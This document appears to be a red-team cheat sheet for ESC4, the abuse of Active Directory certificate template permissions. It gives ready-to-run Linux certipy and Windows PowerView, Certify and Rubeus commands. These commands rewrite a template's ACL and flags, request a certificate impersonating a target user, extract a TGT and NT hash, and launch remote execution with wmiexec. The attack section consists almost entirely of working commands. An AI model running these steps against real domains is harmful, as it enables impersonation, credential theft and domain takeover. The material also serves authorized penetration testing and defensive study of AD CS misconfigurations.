# ESC4—Vulnerable Certificate Template Access Control (ACL) Abuse

## Theory

If you have powerful rights (e.g., **FullControl**, **WriteDACL**, **WriteOwner**, **WriteProperty**) over a certificate **template** object in AD, you can change its settings to make it behave like an **ESC1**-style template: low-privileged users can enroll, **enrollee supplies subject (SAN)** is enabled, no manager approval or authorized signatures are required, and the template has an **authentication EKU**. Then you request a cert with a **target user’s UPN in the SAN** and authenticate as that user.

## Requirements

- Rights over the **template** sufficient to modify its ACL/properties (e.g., **FullControl or GenericWrite**).
- Modify the template to:
    - **Grant Enroll** to a low-privileged principal (e.g., Domain Users).
    - **Disable manager approval**: clear `PEND_ALL_REQUESTS` in `mspki-enrollment-flag`.
    - **Disable authorized signatures**: set `mspki-ra-signature` to `0`.
    - **Allow SAN/subject supply**: set `ENROLLEE_SUPPLIES_SUBJECT` in `mspki-certificate-name-flag`.
    - **Enable authentication EKU** via `pkiextendedkeyusage` and `mspki-certificate-application-policy`, e.g.:
        - Client Authentication `1.3.6.1.5.5.7.3.2`
        - (or) Smart Card Logon `1.3.6.1.4.1.311.20.2.2`
        - (or) PKINIT Client Authentication `1.3.6.1.5.2.3.4`
        - (or) Any Purpose `2.5.29.37.0`
        - (or) No EKU

### Placeholders

`<DOMAIN>` `<FOREST_DN>` `<DC_IP>` `<CA_NAME>` `<CA_FQDN>` `<TEMPLATE_NAME>` `<USER>` `<PASS>` `<TARGET_UPN>` `<TARGET_USER>` `<OUT_PEM>` `<OUT_PFX>`

---

## Linux

### Enumerate (find Templates You Can control)

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# In "Object Control Permissions", confirm your account/group has FullControl/WriteDACL/WriteOwner/WriteProperty on <TEMPLATE_NAME>.
```

### Attack—one-shot Template Hardening Bypass (save → Modify → Abuse → restore)

1. **Save current template config**

```bash
certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -template '<TEMPLATE_NAME>' -save-old
# => writes <TEMPLATE_NAME>.json
```

1. **Auto-modify template to ESC1-like state**

```bash
certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -template '<TEMPLATE_NAME>'
# This sets: EnrolleeSuppliesSubject, adds auth EKU, disables manager approval & authorized signatures, etc.
```

1. **Request cert impersonating target**

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' \
  -template '<TEMPLATE_NAME>' -upn '<TARGET_UPN>' -out '<OUT_PFX>'
# => '<OUT_PFX>' contains a cert+key for <TARGET_UPN>
```

1. **Authenticate / extract target creds**

```bash
certipy auth -pfx '<OUT_PFX>.pfx' -username '<TARGET_USER>' -domain '<DOMAIN>' -dc-ip <DC_IP>
# => Saves <TARGET_USER>.ccache and may output NT hash.
```

1. **Restore original template configuration**

```bash
certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -template '<TEMPLATE_NAME>' -configuration '<TEMPLATE_NAME>.json'
```

1. **Use TGT**

```bash
KRB5CCNAME=<TARGET_USER>.ccache wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
```

---

## Windows

### Enumerate (identify Template You Can edit)

```powershell
.\Certify.exe find
# Manually check "<TEMPLATE_NAME>" in "Object Control Permissions":
#   you (or your group) should have Full Control / WriteOwner / WriteDacl / WriteProperty.
```

### Attack—make Template ESC1-like with PowerView, then Enroll & Authenticate

1. **Load PowerView**

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
```

1. **Grant Enroll to a broad group (e.g., Domain Users)**

```powershell
Add-DomainObjectAcl -TargetIdentity '<TEMPLATE_NAME>' -PrincipalIdentity 'Domain Users' `
  -RightsGUID '0e10c968-78fb-11d2-90d4-00c04f79dc55' `
  -TargetSearchBase 'LDAP://CN=Configuration,<FOREST_DN>' -Verbose
```

1. **Disable manager approval (clear PEND_ALL_REQUESTS)**

```powershell
Set-DomainObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<FOREST_DN>' `
  -Identity '<TEMPLATE_NAME>' -Set @{'mspki-enrollment-flag'=9} -Verbose
# 9 = INCLUDE_SYMMETRIC_ALGORITHMS(1) + PUBLISH_TO_DS(8); does not include PEND_ALL_REQUESTS(2)
```

1. **Disable authorized signatures**

```powershell
Set-DomainObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<FOREST_DN>' `
  -Identity '<TEMPLATE_NAME>' -Set @{'mspki-ra-signature'=0} -Verbose
```

1. **Allow requester-supplied subject/SAN**

```powershell
Set-DomainObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<FOREST_DN>' `
  -Identity '<TEMPLATE_NAME>' -Set @{'mspki-certificate-name-flag'=1} -Verbose
# 1 = ENROLLEE_SUPPLIES_SUBJECT
```

1. **Set authentication EKU(s)**

```powershell
Set-DomainObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<FOREST_DN>' `
  -Identity '<TEMPLATE_NAME>' -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose

Set-DomainObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<FOREST_DN>' `
  -Identity '<TEMPLATE_NAME>' -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

1. **(Optional) Verify template now shows as vulnerable**

```powershell
.\Certify.exe find /vulnerable
```

1. **Request a cert with target’s UPN in SAN**

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:<TARGET_UPN> > <OUT_PEM>
```

1. **Convert to PFX**

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in <OUT_PEM> -keyex `
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <OUT_PFX>
```

1. **Authenticate as target**

```powershell
.\Rubeus.exe asktgt /user:<TARGET_USER> /certificate:<OUT_PFX> /getcredentials /nowrap
# => Base64 TGT and possibly NTLM for <TARGET_USER>
```

**Cleanup:** Revert the template to its original settings (use the saved JSON via `certipy template -configuration <TEMPLATE_NAME>.json` from Linux, or manually undo the attributes and ACL changes if working solely from Windows).
